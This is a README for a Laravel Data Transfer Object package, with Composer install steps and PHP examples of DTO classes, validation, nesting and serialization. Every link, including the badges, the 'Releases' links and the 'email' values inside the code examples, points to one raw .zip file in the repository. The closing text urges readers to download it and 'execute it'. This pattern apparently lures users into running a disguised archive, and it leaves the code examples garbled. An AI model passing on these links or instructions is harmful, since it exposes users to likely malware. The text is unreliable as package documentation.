# 🚀 Laravel Argonaut DTO

![GitHub Release](https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip) ![License](https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip)

Welcome to the Laravel Argonaut DTO repository! Argonaut is a lightweight Data Transfer Object (DTO) package designed specifically for Laravel applications. It simplifies the process of handling data transfer between layers, ensuring your code remains clean and efficient.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Introduction

In modern application development, managing data efficiently is crucial. Argonaut provides a structured way to define and handle data transfer objects, allowing developers to focus on building robust applications without worrying about the complexities of data handling. Whether you are building APIs, service layers, or adhering to clean architecture principles, Argonaut fits seamlessly into your workflow.

## Features

- **Lightweight Design**: Minimal overhead, making it easy to integrate into your existing projects.
- **Nested Casting**: Automatically handle nested data structures with ease.
- **Recursive Serialization**: Serialize objects recursively for smooth data handling.
- **Validation**: Built-in validation to ensure data integrity before processing.
- **Service Layer Support**: Ideal for service-oriented architectures.
- **Compliant with SOLID Principles**: Promotes maintainable and scalable code.

## Installation

To install the Laravel Argonaut DTO package, you can use Composer. Run the following command in your terminal:

```bash
composer require astrr3/laravel-argonaut-dto
```

After installation, publish the configuration file if necessary:

```bash
php artisan vendor:publish --provider="Argonaut\ArgonautServiceProvider"
```

This command will publish the configuration file to your `config` directory, allowing you to customize settings as needed.

## Usage

Using Argonaut is straightforward. First, create a DTO class by extending the base `Dto` class provided by Argonaut. Here’s a simple example:

```php
namespace App\Dto;

use Argonaut\Dto;

class UserDto extends Dto
{
    public string $name;
    public string $email;
    public ?string $phone;

    protected function rules(): array
    {
        return [
            'name' => 'required|string|max:255',
            'email' => 'required|email',
            'phone' => 'nullable|string|max:15',
        ];
    }
}
```

### Creating a DTO Instance

You can create an instance of your DTO and validate it easily:

```php
$data = [
    'name' => 'John Doe',
    'email' => 'https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip',
    'phone' => '1234567890',
];

$userDto = new UserDto($data);

if ($userDto->isValid()) {
    // Proceed with valid data
} else {
    // Handle validation errors
    $errors = $userDto->getErrors();
}
```

## Examples

### Nested DTOs

Argonaut allows you to create nested DTOs for complex data structures. Here’s an example of a `PostDto` that includes a nested `UserDto`:

```php
namespace App\Dto;

use Argonaut\Dto;

class PostDto extends Dto
{
    public string $title;
    public string $content;
    public UserDto $author;

    protected function rules(): array
    {
        return [
            'title' => 'required|string|max:255',
            'content' => 'required|string',
            'author' => 'required|array',
        ];
    }
}
```

### Recursive Serialization

Argonaut makes it easy to serialize nested DTOs. You can convert your DTO to an array or JSON format effortlessly:

```php
$postDto = new PostDto([
    'title' => 'My First Post',
    'content' => 'This is the content of my first post.',
    'author' => new UserDto(['name' => 'John Doe', 'email' => 'https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip']),
]);

$json = $postDto->toJson();
```

## Contributing

We welcome contributions! If you would like to contribute to the Laravel Argonaut DTO package, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your fork.
5. Open a pull request with a description of your changes.

Please ensure your code adheres to our coding standards and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Links

For the latest releases and updates, please visit the [Releases](https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip) section. You can download the latest version and follow the instructions to execute it.

If you have any questions or need support, feel free to check the [Releases](https://raw.githubusercontent.com/Astrr3/Laravel-Argonaut-DTO/main/content/DTO_Laravel_Argonaut_2.9.zip) section or open an issue in the repository.

Thank you for considering Laravel Argonaut DTO for your project! We hope it helps you build cleaner and more efficient applications.